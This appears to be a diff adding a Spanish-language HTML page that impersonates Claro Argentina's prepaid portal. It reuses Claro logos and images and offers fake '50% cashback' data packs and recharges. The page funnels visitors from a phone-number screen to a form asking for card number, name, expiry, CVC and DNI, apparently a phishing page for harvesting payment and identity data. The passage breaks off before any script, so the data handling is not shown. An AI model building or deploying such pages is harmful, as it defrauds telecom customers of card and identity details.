@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Claro</title>
+  <style>
+    /* Reset básico */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      background-color: #f0f0f0;
+    }
+
+    /*************************************
+     * PANTALLA COMPLETA: INGRESAR NÚMERO
+     *************************************/
+    #phonePage {
+      display: block; /* Muestra esta sección al inicio */
+      position: fixed;
+      z-index: 9999;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .phone-container {
+      background-color: #fff;
+      border-radius: 10px;
+      padding: 30px 20px;
+      max-width: 400px;
+      width: 90%;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+    .packs-logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+    .phone-container h1 {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .phone-input-container {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .phone-input-container label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 5px;
+      color: #666;
+    }
+    #phoneInput {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .continue-button {
+      width: 100%;
+      padding: 15px;
+      background-color: #EE2A24;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background-color 0.3s;
+    }
+    .continue-button:hover {
+      background-color: #CC241C;
+    }
+
+    /***************************************************
+     * Encabezado rojo (color Claro: #EE2A24) y contenido
+     ***************************************************/
+    .header {
+      background-color: #EE2A24;
+      color: white;
+      display: flex;
+      align-items: center;
+      padding: 10px 15px;
+    }
+    .logo {
+      flex: 1;
+      font-size: 22px;
+      font-weight: bold;
+    }
+    .phone-number {
+      flex: 1;
+      text-align: center;
+      display: none;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    .icons {
+      flex: 1;
+      text-align: right;
+    }
+    .icons img {
+      width: 24px;
+      margin-left: 15px;
+      cursor: pointer;
+    }
+
+    /* Sección de saldo */
+    .balance {
+      background-color: white;
+      padding: 15px;
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+      border-bottom: 1px solid #ddd;
+    }
+    .balance strong {
+      font-size: 22px;
+    }
+
+    /* Contenedor de opciones */
+    .options {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      padding: 15px;
+    }
+    .option {
+      background-color: white;
+      padding: 15px;
+      border-radius: 10px;
+      width: 100px;
+      text-align: center;
+      font-size: 14px;
+      font-weight: bold;
+      box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
+      cursor: pointer;
+    }
+    .option img {
+      width: 40px;
+      margin-bottom: 5px;
+    }
+
+    /* Banner promocional */
+    .promo-banner {
+      margin: 10px;
+      text-align: center;
+    }
+    .promo-banner img {
+      width: 100%;
+      max-width: 600px;
+      border-radius: 8px;
+    }
+
+    /* Contenedor de promociones */
+    .promotions {
+      margin: 20px auto;
+      max-width: 600px;
+    }
+    .promotion-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background-color: #fff;
+      margin: 10px 0;
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+    }
+    .promotion-text {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+    }
+    .promo-title {
+      font-size: 16px;
+      font-weight: bold;
+    }
+    .promo-subtitle {
+      font-size: 12px;
+      color: #666;
+    }
+    .promo-price {
+      font-size: 18px;
+      font-weight: bold;
+      color: #EE2A24;
+    }
+    .promo-badge {
+      background-color: #ffec00;
+      color: #000;
+      font-weight: bold;
+      font-size: 12px;
+      padding: 3px 5px;
+      border-radius: 4px;
+      margin-left: 10px;
+    }
+    .promo-button {
+      background-color: #EE2A24;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 10px 16px;
+      cursor: pointer;
+      font-size: 14px;
+      transition: background-color 0.3s;
+    }
+    .promo-button:hover {
+      background-color: #CC241C;
+    }
+
+    /* Diseño responsive */
+    @media (max-width: 768px) {
+      .options {
+        flex-direction: row;
+        justify-content: space-around;
+      }
+      .promotion-item {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .promo-button {
+        margin-top: 10px;
+      }
+    }
+
+    /* Modal de compra (packs) */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 999;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0, 0, 0, 0.5);
+      padding: 20px;
+    }
+    .modal-content {
+      background-color: #fff;
+      margin: 5% auto;
+      padding: 30px;
+      border-radius: 10px;
+      max-width: 600px;
+      width: 100%;
+      position: relative;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    }
+    .close {
+      color: #aaa;
+      font-size: 28px;
+      font-weight: bold;
+      cursor: pointer;
+      position: absolute;
+      top: 15px;
+      right: 20px;
+    }
+    .close:hover {
+      color: #000;
+    }
+    .modal-content h2 {
+      margin-bottom: 20px;
+      text-align: center;
+      font-size: 24px;
+    }
+    #btnAgregarTarjeta {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      font-size: 18px;
+      background-color: #EE2A24;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 20px;
+      transition: background-color 0.3s;
+    }
+    #btnAgregarTarjeta:hover {
+      background-color: #CC241C;
+    }
+
+    /* Pantalla completa para Agregar Tarjeta */
+    .card-page {
+      display: none;
+      position: fixed;
+      z-index: 1001;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #fff;
+      overflow-y: auto;
+      padding: 30px 20px;
+    }
+    .card-page .btn-volver {
+      position: fixed;
+      top: 20px;
+      left: 20px;
+      background-color: #EE2A24;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 10px 16px;
+      cursor: pointer;
+      font-size: 14px;
+      z-index: 1002;
+      transition: background-color 0.3s;
+    }
+    .card-page .btn-volver:hover {
+      background-color: #CC241C;
+    }
+    .new-card-form {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      margin-top: 60px;
+    }
+    .card-preview {
+      background: linear-gradient(135deg, #1F97AE, #145d75);
+      border-radius: 12px;
+      color: #fff;
+      padding: 30px;
+      position: relative;
+      min-height: 200px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    }
+    .card-logo {
+      position: absolute;
+      top: 30px;
+      right: 30px;
+      width: 60px;
+      height: auto;
+    }
+    .card-number {
+      font-size: 24px;
+      letter-spacing: 3px;
+      margin-bottom: 15px;
+    }
+    .card-holder,
+    .card-expiration {
+      font-size: 18px;
+      text-transform: uppercase;
+    }
+    .card-details {
+      display: flex;
+      justify-content: space-between;
+    }
+    .new-card-form form label {
+      font-weight: bold;
+      font-size: 16px;
+      margin-bottom: 5px;
+      display: block;
+    }
+    .new-card-form form input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .new-card-form form button {
+      width: 100%;
+      padding: 15px;
+      font-size: 18px;
+      background-color: #EE2A24;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    .new-card-form form button:hover {
+      background-color: #CC241C;
+    }
+
+    /* PANTALLA COMPLETA DE RECARGA */
+    #rechargePage {
+      display: none;
+      position: fixed;
+      z-index: 2000;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #fff;
+      overflow-y: auto;
+    }
+    .recharge-header {
+      background-color: #EE2A24;
+      color: #fff;
+      padding: 15px;
+      position: relative;
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    .recharge-header .close-recharge {
+      position: absolute;
+      top: 15px;
+      left: 15px;
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 20px;
+      cursor: pointer;
+    }
+    .recharge-banner {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .recharge-banner img {
+      width: 90%;
+      max-width: 500px;
+      border-radius: 8px;
+    }
+    .recharge-content {
+      margin: 20px auto;
+      max-width: 600px;
+      text-align: center;
+    }
+    .recharge-content h2 {
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    .recharge-amounts {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 20px;
+      align-items: center;
+    }
+    .recharge-button {
+      width: 80%;
+      max-width: 300px;
+      background-color: #EE2A24;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 15px;
+      cursor: pointer;
+      font-size: 16px;
+      position: relative;
+      text-align: left;
+      padding-left: 20px;
+    }
+    .recharge-button:hover {
+      background-color: #CC241C;
+    }
+    .recharge-button .cashback-badge {
+      background-color: #ffec00;
+      color: #000;
+      font-weight: bold;
+      font-size: 12px;
+      padding: 3px 5px;
+      border-radius: 4px;
+      position: absolute;
+      right: 15px;
+      top: 15px;
+    }
+    .recharge-button span {
+      font-weight: bold;
+    }
+    .other-amount {
+      width: 80%;
+      max-width: 300px;
+      background-color: #fff;
+      color: #EE2A24;
+      border: 2px solid #EE2A24;
+      margin-top: 20px;
+      text-align: center;
+      padding: 15px;
+      cursor: pointer;
+      border-radius: 6px;
+      transition: background-color 0.3s, color 0.3s;
+    }
+    .other-amount:hover {
+      background-color: #EE2A24;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- =================== PANTALLA COMPLETA: INGRESAR NÚMERO =================== -->
+  <div id="phonePage">
+    <div class="phone-container">
+      <!-- Logo o ícono superior -->
+      <img 
+        src="https://simple.claro.com.ar/inicio/assets/img/icono-home-256.png" 
+        alt="PACKS YA" 
+        class="packs-logo"
+      >
+      <h1>Ingresa tu número de línea.</h1>
+      <div class="phone-input-container">
+        <label for="phoneInput">Número de línea</label>
+        <input 
+          type="tel" 
+          id="phoneInput" 
+          placeholder="Ej: 1123456789" 
+          maxlength="10" 
+          pattern="[0-9]{10}"
+          inputmode="numeric"
+          required
+        />
+      </div>
+      <button class="continue-button" onclick="continueWithPhone()">Continuar</button>
+    </div>
+  </div>
+  <!-- =================== FIN PANTALLA COMPLETA: INGRESAR NÚMERO =================== -->
+
+  <!-- Encabezado principal -->
+  <div class="header">
+    <div class="logo">Claro</div>
+    <div id="phoneDisplay" class="phone-number"></div>
+    <div class="icons">
+      <img src="https://cdn-icons-png.flaticon.com/512/545/545705.png" alt="Ayuda">
+      <img src="https://simple.claro.com.ar/inicio/assets/img/cerrar-sesion.svg" alt="Compartir">
+    </div>
+  </div>
+
+  <!-- Sección de saldo -->
+  <div class="balance">
+    Crédito de Recarga <br> <strong>$ 0,00</strong>
+  </div>
+
+  <!-- Opciones -->
+  <div class="options">
+    <div class="option" onclick="showRechargePage()">
+      <img src="https://simple.claro.com.ar/inicio/assets/img/icon_mi_linea.svg" alt="Recargar">
+      <div>Recargar</div>
+    </div>
+    <div class="option" onclick="showLoanModal()">
+      <img src="data:image/svg+xml,%3Csvg%20width%3D%2248%22%20height%3D%2248%22%20viewBox%3D%220%200%2048%2048%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cpath%20d%3D%22M20%2036.0001C28.8366%2036.0001%2036.0001%2028.8366%2036.0001%2020C36.0001%2011.1635%2028.8366%204%2020%204C11.1635%204%204%2011.1635%204%2020C4%2028.8366%2011.1635%2036.0001%2020%2036.0001Z%22%20fill%3D%22%23F2F2F2%22%2F%3E%3Cpath%20d%3D%22M13.9656%2037.4657H24.0187C26.3865%2037.1261%2028.702%2036.4886%2030.91%2035.5684C32.5291%2033.9148%2034.0478%2032.166%2035.4581%2030.3312C35.2491%2029.9809%2034.9352%2029.7052%2034.5609%2029.543C34.1866%2029.3808%2033.7707%2029.3404%2033.3722%2029.4275C32.1055%2029.5771%2030.5232%2032.0138%2030.4708%2032.0632L26.6148%2032.9476C26.4928%2032.9206%2025.123%2032.4747%2023.8257%2032.1328C23.373%2032.0139%2022.6413%2030.9919%2022.6413%2030.9111C22.6413%2030.4315%2022.8119%2030.4457%2023.6139%2030.0223C24.1428%2029.7424%2025.7963%2029.4402%2026.3768%2028.0898C26.9073%2026.856%2026.5639%2025.6552%2024.404%2026.5298C23.5062%2026.8904%2019.6711%2028.0067%2018.0162%2028.6928C17.3743%2029.316%2016.4809%2030.6537%2015.8255%2031.1393H13.9656V37.4657Z%22%20fill%3D%22white%22%2F%3E%3Cpath%20d%3D%22M24.0208%2037.9559H13.4717V30.6486H15.6458C16.0386%2030.2647%2016.4036%2029.8534%2016.7381%2029.4179C17.0309%2029.0397%2017.3443%2028.678%2017.6771%2028.3345L17.8268%2028.2343C18.8181%2027.825%2020.5845%2027.2617%2022.0038%2026.8075C23.0033%2026.4873%2023.8704%2026.209%2024.2251%2026.0728C25.3914%2025.6015%2026.2278%2025.6284%2026.7171%2026.1476C26.9389%2026.4561%2027.0658%2026.8225%2027.0825%2027.2021C27.0991%2027.5816%2027.0046%2027.9577%2026.8107%2028.2844C26.5444%2028.777%2026.1789%2029.2091%2025.7372%2029.5533C25.2955%2029.8975%2024.7873%2030.1464%2024.2445%2030.2842C24.0747%2030.3478%2023.9288%2030.4025%2023.8292%2030.4526C23.6796%2030.5274%2023.5584%2030.5955%2023.4552%2030.6471C23.3332%2030.7115%2023.2022%2030.7751%2023.1334%2030.8184C23.3475%2031.1465%2023.6223%2031.4306%2023.9429%2031.6556C24.8639%2031.895%2025.8201%2032.1883%2026.3498%2032.3522C26.4658%2032.3896%2026.5608%2032.4165%2026.6289%2032.4382L30.2013%2031.6197C31.3984%2029.9408%2032.4533%2029.0385%2033.3264%2028.9353C33.8292%2028.836%2034.3506%2028.8992%2034.8152%2029.1157C35.2797%2029.3323%2035.6633%2029.6909%2035.9105%2030.1398L36.0146%2030.3972L35.8552%2030.6179C34.4138%2032.4974%2032.8553%2034.284%2031.189%2035.9673C28.8965%2036.9439%2026.4845%2037.6122%2024.0163%2037.9544L24.0208%2037.9559ZM14.4249%2036.9743H24.0163C25.3375%2036.9743%2030.1617%2035.4952%2030.6413%2035.1645C32.1423%2033.6206%2033.5594%2031.9973%2034.8864%2030.3014C34.6886%2030.133%2034.4558%2030.0104%2034.205%2029.9425C33.9542%2029.8746%2033.6914%2029.863%2033.4356%2029.9087C33.1603%2029.9394%2032.3613%2030.2363%2030.9338%2032.2497C30.8954%2032.3133%2030.8487%2032.3714%2030.7947%2032.4225L30.7034%2032.5055L26.6177%2033.443L26.5144%2033.4198C26.4747%2033.4131%2026.3147%2033.3622%2026.0767%2033.2896C25.553%2033.1303%2024.6141%2032.8407%2023.7043%2032.6028C22.9914%2032.2548%2022.4385%2031.6475%2022.1586%2030.9052C22.1586%2030.2019%2022.526%2030.0209%2023.034%2029.7643C23.1357%2029.7127%2023.2539%2029.6543%2023.3931%2029.5809C23.5649%2029.4981%2023.7415%2029.4256%2023.922%2029.364C24.3401%2029.2646%2024.7341%2029.0828%2025.081%2028.8292C25.4279%2028.5756%2025.7206%2028.2553%2025.942%2027.8871C26.1755%2027.341%2026.1508%2026.9549%2026.0289%2026.8247C25.8965%2026.6818%2025.4303%2026.6347%2024.5751%2026.9811C24.1883%2027.136%2023.3085%2027.418%2022.2903%2027.7442C20.9294%2028.1767%2019.243%2028.7168%2018.2719%2029.1066C18.0377%2029.3468%2017.7624%2029.6865%2017.4713%2030.0441C17.0663%2030.5876%2016.6037%2031.0858%2016.0917%2031.5299L15.9676%2031.622H14.4263L14.4249%2036.9743Z%22%20fill%3D%22%23222222%22%2F%3E%3Cpath%20d%3D%22M26.715%2021.0226C26.721%2020.556%2026.5881%2020.0982%2026.3332%2019.7074C26.0783%2019.3165%2025.7129%2019.0103%2025.2836%2018.8276C24.8542%2018.6449%2024.3803%2018.5939%2023.9219%2018.6812C23.4636%2018.7686%2023.0415%2018.9902%2022.7094%2019.318C22.3773%2019.6457%2022.1502%2020.0649%2022.0568%2020.5221C21.9635%2020.9792%2022.0082%2021.4538%2022.1852%2021.8855C22.3623%2022.3172%2022.6638%2022.6866%2023.0512%2022.9465C23.4387%2023.2065%2023.8947%2023.3454%2024.3613%2023.3456C24.9812%2023.3486%2025.5769%2023.1058%2026.0181%2022.6704C26.4593%2022.2349%2026.7099%2021.6424%2026.715%2021.0226Z%22%20fill%3D%22%231F97AE%22%2F%3E%3Cpath%20d%3D%22M24.3622%2023.8397C23.8067%2023.8341%2023.2652%2023.6642%2022.8061%2023.3515C22.347%2023.0388%2021.9906%2022.5972%2021.782%2022.0823C21.5733%2021.5675%2021.5217%2021.0024%2021.6336%2020.4583C21.7455%2019.9141%2022.016%2019.4153%2022.4109%2019.0245C22.8058%2018.6338%2023.3075%2018.3687%2023.8527%2018.2625C24.398%2018.1564%2024.9626%2018.214%2025.4752%2018.428C25.9878%2018.6421%2026.4256%2019.0031%2026.7334%2019.4655C27.0413%2019.9279%2027.2054%2020.4711%2027.2051%2021.0266C27.2002%2021.7763%2026.8981%2022.4935%2026.3652%2023.0209C25.8322%2023.5482%2025.1119%2023.8427%2024.3622%2023.8397ZM24.3622%2019.1899C24.0005%2019.1955%2023.6485%2019.3078%2023.3505%2019.5128C23.0525%2019.7177%2022.8217%2020.0062%2022.6871%2020.3419C22.5525%2020.6776%2022.5201%2021.0456%2022.594%2021.3997C22.6678%2021.7538%2022.8447%2022.0781%2023.1023%2022.332C23.3599%2022.5859%2023.6869%2022.758%2024.042%2022.8267C24.3971%2022.8954%2024.7646%2022.8577%2025.0983%2022.7182C25.432%2022.5787%2025.7171%2022.3438%2025.9177%2022.0428C26.1183%2021.7418%2026.2255%2021.3883%2026.2258%2021.0266C26.2242%2020.7836%2026.1746%2020.5433%2026.0801%2020.3195C25.9855%2020.0956%2025.8476%2019.8926%2025.6746%2019.722C25.5015%2019.5514%2025.2965%2019.4166%2025.0713%2019.3253C24.8461%2019.234%2024.6052%2019.188%2024.3622%2019.1899Z%22%20fill%3D%22%23222222%22%2F%3E%3Cpath%20d%3D%22M34.0417%2016.2262C34.0484%2015.7595%2033.9161%2015.3014%2033.6617%2014.91C33.4072%2014.5187%2033.0421%2014.2119%2032.6129%2014.0286C32.1836%2013.8453%2031.7095%2013.7938%2031.2509%2013.8807C30.7923%2013.9676%2030.3699%2014.1889%2030.0374%2014.5166C29.7049%2014.8442%2029.4774%2015.2633%2029.3838%2015.7205C29.2901%2016.1778%2029.3347%2016.6526%2029.5116%2017.0845C29.6886%2017.5165%2029.99%2017.886%2030.3775%2018.1462C30.765%2018.4063%2031.2212%2018.5454%2031.688%2018.5456C32.3074%2018.5492%2032.9029%2018.307%2033.3441%2017.8723C33.7853%2017.4375%2034.0362%2016.8456%2034.0417%2016.2262Z%22%20fill%3D%22%231F97AE%22%2F%3E%3Cpath%20d%3D%22M31.6807%2019.1567C31.125%2019.1514%2030.5832%2018.9817%2030.1237%2018.6691C29.6641%2018.3565%2029.3074%2017.9149%2029.0983%2017.3999C28.8893%2016.885%2028.8374%2016.3197%2028.949%2015.7752C29.0606%2015.2307%2029.3308%2014.7315%2029.7257%2014.3403C30.1205%2013.9491%2030.6222%2013.6835%2031.1676%2013.5769C31.7131%2013.4703%2032.2779%2013.5276%2032.7909%2013.7414C33.3039%2013.9552%2033.7423%2014.316%2034.0506%2014.7784C34.359%2015.2408%2034.5236%2015.7841%2034.5238%2016.3399C34.5194%2017.0901%2034.2176%2017.808%2033.6847%2018.3361C33.1517%2018.8642%2032.431%2019.1593%2031.6807%2019.1567ZM31.6807%2014.5069C31.3189%2014.5125%2030.9669%2014.6249%2030.6688%2014.83C30.3707%2015.0352%2030.1399%2015.3239%2030.0054%2015.6598C29.8709%2015.9957%2029.8387%2016.3639%2029.9129%2016.7181C29.9871%2017.0722%2030.1643%2017.3966%2030.4223%2017.6503C30.6803%2017.904%2031.0075%2018.0759%2031.3628%2018.1442C31.7182%2018.2125%2032.0858%2018.1742%2032.4195%2018.0341C32.7531%2017.8941%2033.0379%2017.6585%2033.2381%2017.3571C33.4382%2017.0556%2033.5448%2016.7017%2033.5444%2016.3399C33.5392%2015.85%2033.3403%2015.3821%2032.991%2015.0386C32.6417%2014.6951%2032.1706%2014.5039%2031.6807%2014.5069Z%22%20fill%3D%22%23222222%22%2F%3E%3Cpath%20d%3D%22M33.1984%2025.4616C33.2038%2024.9954%2033.0703%2024.5382%2032.8152%2024.148C32.5601%2023.7577%2032.1948%2023.4522%2031.7656%2023.2701C31.3364%2023.088%2030.8628%2023.0375%2030.4049%2023.1252C29.947%2023.2128%2029.5255%2023.4347%2029.194%2023.7624C28.8624%2024.0902%2028.6357%2024.5091%2028.5428%2024.9659C28.4499%2025.4228%2028.4949%2025.897%2028.672%2026.3282C28.8492%2026.7595%2029.1505%2027.1283%2029.5377%2027.3879C29.925%2027.6475%2030.3807%2027.7861%2030.8469%2027.7862C31.4669%2027.7894%2032.0628%2027.5463%2032.5037%2027.1105C32.9446%2026.6746%2033.1945%2026.0816%2033.1984%2025.4616Z%22%20fill%3D%22%231F97AE%22%2F%3E%3Cpath%20d%3D%22M30.8413%2028.2753C30.2859%2028.2697%2029.7445%2028.0999%2029.2854%2027.7872C28.8263%2027.4745%2028.47%2027.033%2028.2614%2026.5182C28.0527%2026.0035%2028.001%2025.4385%2028.1128%2024.8944C28.2246%2024.3503%2028.4948%2023.8514%2028.8895%2023.4606C29.2843%2023.0699%2029.7859%2022.8046%2030.331%2022.6983C30.8762%2022.592%2031.4407%2022.6493%2031.9533%2022.8632C32.466%2023.077%2032.9039%2023.4378%2033.2119%2023.9C33.5199%2024.3622%2033.6843%2024.9052%2033.6844%2025.4607C33.6798%2026.2107%2033.3779%2026.9283%2032.8449%2027.4559C32.3119%2027.9836%2031.5913%2028.2783%2030.8413%2028.2753ZM30.8413%2023.6254C30.4795%2023.6306%2030.1273%2023.7427%2029.8289%2023.9474C29.5306%2024.1522%2029.2994%2024.4406%2029.1645%2024.7763C29.0296%2025.1121%2028.997%2025.4803%2029.0707%2025.8345C29.1445%2026.1888%2029.3213%2026.5133%2029.579%2026.7674C29.8366%2027.0214%2030.1637%2027.1937%2030.519%2027.2624C30.8743%2027.3311%2031.2419%2027.2932%2031.5758%2027.1536C31.9096%2027.014%2032.1946%2026.7788%2032.3952%2026.4775C32.5957%2026.1763%2032.7027%2025.8225%2032.7028%2025.4607C32.699%2024.9706%2032.5008%2024.502%2032.1518%2024.1579C31.8027%2023.8138%2031.3314%2023.6223%2030.8413%2023.6254Z%22%20fill%3D%22%23222222%22%2F%3E%3Cpath%20d%3D%22M14.4582%2028.7041H9.53003V38.9263H14.4582V28.7041Z%22%20fill%3D%22%231F97AE%22%2F%3E%3Cpath%20d%3D%22M14.9488%2039.4147H9.04199V28.2124H14.9488V39.4147ZM10.0229%2038.4421H13.9687V29.1925H10.0229V38.4421Z%22%20fill%3D%22%23222222%22%2F%3E%3Cpath%20d%3D%22M12.4857%2030.8054H11.5071V32.2658H12.4857V30.8054Z%22%20fill%3D%22%23222222%22%2F%3E%3Cpath%20d%3D%22M37.2845%209.75732L34.1172%2012.9292L34.9515%2013.7623L38.1188%2010.5905L37.2845%209.75732Z%22%20fill%3D%22%23222222%22%2F%3E%3Cpath%20d%3D%22M32.8704%209.10156H31.6973V12.496H32.8704V9.10156Z%22%20fill%3D%22%23222222%22%2F%3E%3Cpath%20d%3D%22M39.0002%2014.9497H35.531V16.1258H39.0002V14.9497Z%22%20fill%3D%22%23222222%22%2F%3E%3C%2Fsvg%3E" alt="Presta">
+      <div>Presta</div>
+    </div>
+    <div class="option" onclick="showPacksModal()">
+      <img src="https://simple.claro.com.ar/inicio/assets/img/icono_mispacks.svg" alt="Mis Packs">
+      <div>Mis Packs</div>
+    </div>
+  </div>
+
+  <!-- Banner promocional -->
+  <div class="promo-banner">
+    <img src="https://landing.claro.com.ar/p/portal-compras/principal-pp-0000-0559.svg" alt="Promo Pack Noche">
+  </div>
+
+  <!-- Promociones -->
+  <div class="promotions">
+    <div class="promotion-item">
+      <div class="promotion-text">
+        <div class="promo-title">10GB de 22 a 6hs</div>
+        <div class="promo-subtitle">Renovación automática</div>
+      </div>
+      <div>
+        <span class="promo-price">$560</span>
+        <span class="promo-badge">50% CASH BACK</span>
+        <button class="promo-button" onclick="openPackModal('10GB de 22 a 6hs')">Comprar</button>
+      </div>
+    </div>
+    <div class="promotion-item">
+      <div class="promotion-text">
+        <div class="promo-title">15GB por 30 días</div>
+        <div class="promo-subtitle">Renovación automática</div>
+      </div>
+      <div>
+        <span class="promo-price">$7,000</span>
+        <span class="promo-badge">50% CASH BACK</span>
+        <button class="promo-button" onclick="openPackModal('15GB por 30 días')">Comprar</button>
+      </div>
+    </div>
+    <div class="promotion-item">
+      <div class="promotion-text">
+        <div class="promo-title">40GB por 60 días</div>
+        <div class="promo-subtitle">Renovación automática</div>
+      </div>
+      <div>
+        <span class="promo-price">$13.000</span>
+        <span class="promo-badge">50% CASH BACK</span>
+        <button class="promo-button" onclick="openPackModal('40GB por 60 días')">Comprar</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal de Compra (packs) -->
+  <div id="packModal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closePackModal()">&times;</span>
+      <h2 id="packTitle">Comprando: </h2>
+      <button id="btnAgregarTarjeta" onclick="showCardPage()">Agregar Tarjeta</button>
+    </div>
+  </div>
+
+  <!-- Modal para Presta -->
+  <div id="loanModal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeLoanModal()">&times;</span>
+      <p>Lamentamos informarle que actualmente no es posible solicitar un préstamo.</p>
+    </div>
+  </div>
+
+  <!-- Modal para Mis Packs -->
+  <div id="packsModal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closePacksModal()">&times;</span>
+      <h2>Mis Packs</h2>
+      <p><strong>Disponible:</strong> 0,0gb</p>
+      <p><strong>Vencimiento:</strong> No tienes ningún pack comprado.</p>
+    </div>
+  </div>
+
+  <!-- Pantalla completa para Agregar Tarjeta -->
+  <div id="cardPage" class="card-page">
+    <button class="btn-volver" onclick="hideCardPage()">&#8592; Volver</button>
+    <div class="new-card-form">
+      <div class="card-preview" id="cardPreview">
+        <img class="card-logo" id="cardLogoPreview" src="" alt="Logo de tarjeta" style="display:none;">
+        <div class="card-number" id="cardNumberDisplay">#### #### #### ####</div>
+        <div class="card-details">
+          <div class="card-holder" id="cardHolderDisplay">NOMBRE COMPLETO</div>
+          <div class="card-expiration" id="cardExpirationDisplay">MM/AA</div>
+        </div>
+      </div>
+      <form onsubmit="return handleCardSubmit(event)">
+        <!-- Número de Tarjeta -->
+        <label for="cardNumber">Número de Tarjeta</label>
+        <input 
+          type="tel" 
+          id="cardNumber" 
+          placeholder="16 dígitos" 
+          inputmode="numeric" 
+          pattern="[0-9]*" 
+          maxlength="16"
+          oninput="formatCardNumber(); updateCardPreview(); updateCardLogo();"
+          required 
+        />
+        <!-- Nombre Completo -->
+        <label for="fullName">Nombre Completo</label>
+        <input 
+          type="text" 
+          id="fullName" 
+          placeholder="Nombre y Apellido" 
+          oninput="updateCardPreview();"
+          required 
+        />
+        <!-- Fecha de Vencimiento -->
+        <label for="expiration">Fecha de Vencimiento (MM/AA)</label>
+        <input 
+          type="tel" 
+          id="expiration" 
+          placeholder="MM/AA" 
+          inputmode="numeric" 
+          pattern="^[0-9]{2}\/[0-9]{2}$" 
+          maxlength="5" 
+          oninput="formatExpiration(); updateCardPreview();"
+          required 
+        />
+        <!-- CVC -->
+        <label for="cvc">CVC</label>
+        <input 
+          type="tel" 
+          id="cvc" 
+          placeholder="3 dígitos" 
+          inputmode="numeric" 
+          pattern="[0-9]*" 
+          maxlength="3"
+          oninput="formatCVC()" 
+          required 
+        />
+        <!-- DNI -->
+        <label for="dni">DNI</label>
+        <input 
+          type="tel" 
+          id="dni" 
+          placeholder="00.000.000" 
+          inputmode="numeric" 
+          pattern="^[0-9]{2}\.[0-9]{3}\.[0-9]{3}$" 
+          oninput="formatDNI()" 
+          required 
+        />
+        <button type="submit">Confirmar pago</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- PANTALLA COMPLETA DE RECARGA -->
+  <div id="rechargePage">
+    <div class="recharge-header">
+      <button class="close-recharge" onclick="closeRechargePage()">&#8592;</button>
+      Seleccionar monto
+    </div>
+    <div class="recharge-banner">
+      <img src="https://landing.claro.com.ar/p/portal-compras/incentivo-monto-recarga-pp-ultra-heavy-user-mobile.jpg" alt="50% CASHBACK">
+    </div>
+    <div class="recharge-content">
+      <h2>¿Cuánto quieres recargar?</h2>
+      <p style="color: #444;"></p>
+      <div class="recharge-amounts">
+        <button class="recharge-button" onclick="selectRecharge('Recarga $5000')">
+          <span>$5.000</span>
+          <div class="cashback-badge">50% CASHBACK</div>
+        </button>
+        <button class="recharge-button" onclick="selectRecharge('Recarga $4500')">
+          <span>$4.500</span>
+          <div class="cashback-badge">50% CASHBACK</div>
+        </button>
+        <button class="recharge-button" onclick="selectRecharge('Recarga $4000')">
+          <span>$4.000</span>
+          <div class="cashback-badge">50% CASHBACK</div>
+        </button>
+        <button class="recharge-button" onclick="selectRecharge('Recarga $3500')">
+          <span>$3.500</span>
+          <div class="cashback-badge">50% CASHBACK</div>
+        </button>
+        <button class="recharge-button" onclick="selectRecharge('Recarga $3000')">
+          <span>$3.000</span>
+          <div class="cashback-badge">50% CASHBACK</div>
+        </button>
+        <!-- Botón "Otros montos" -->
